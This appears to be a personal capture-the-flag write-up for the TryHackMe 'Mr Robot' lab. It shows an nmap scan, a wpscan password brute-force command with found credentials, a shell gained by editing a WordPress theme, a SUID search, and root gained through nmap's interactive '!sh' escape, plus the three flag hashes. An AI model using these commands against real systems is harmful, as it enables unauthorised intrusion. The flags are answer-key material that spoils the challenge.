
# Info Gathering
```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
```


# machine

box is a machine with limited commands

![](https://i.imgur.com/hX3p3AC.png)


directory listing 



# key 1
![](https://i.imgur.com/ozd7xij.png)
and then there we go thats the first key

```
073403c8a58a1f80d943455fb30724b9
```

```
Cookie: s_cc=true; s_fid=2ED616C455EA7C74-325305B6F9BE78C5; s_nr=1702665025432; s_sq=%5B%5BB%5D%5D
```



---
```bash
wpscan –url IP_ADDRESS_OF_WEBSITE -U USER_NAME -P PATH_TO_WORDLIST
```
elliot:anypasswd (ER28-0652)

elliot@mrrobot.com
---

# users

![](https://i.imgur.com/OO7nlNR.png)

![](https://i.imgur.com/0UDcvXm.png)
looks like can do panel rce by modifying php from theme (admin needed)

by changing the code into a php shell

![](https://i.imgur.com/XVVw3fL.png)


i can successfully get a shell

![](https://i.imgur.com/lafqLti.png)

after getting shell i found out that im user daemon. i wanted to observe the home directory and found user named robot, i then checked and found the second key but had to decrypt the md5 first to access the user robot then extract the second key

![](https://i.imgur.com/9VjiMHT.png)

and here we go thats the second key
```
822c73956184f694993bede3eb39f959
```

after that i need to privesc

i must then run a command to find all the SUID/SGID executables on the vm which showed something <span style="color: red; font-weight: bold; font-size: larger;">SUS</span> ![AMOGOS | 50x50 ](https://cdn.pixabay.com/photo/2021/04/21/10/17/meme-6195988_1280.png)

<iframe width="200" height="150" src="https://www.youtube.com/embed/Regpv0xU3ZQ?si=yTur6dsgY5oNkOcc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>


Message @0xSuper
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

as per given hint it showed "nmap" only 

![](https://i.imgur.com/C98sez8.png)

after researching, I went to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo) to check the nmap sudo, and it showed that 

![](https://i.imgur.com/4YbDgRy.png)



after checking nmap's version it showed that its between these version so i ran the command 

![](https://i.imgur.com/iLCeGn2.png)


```bash
nmap --interactive
nmap> !sh
```

which returned that

![](https://i.imgur.com/wXNVL6J.png)


and successfully gained root access and got my third key which is 

```
04787ddef27c3dee1ee161b21670b4e4
```

---
#mr_robot #ctf #tryhackme

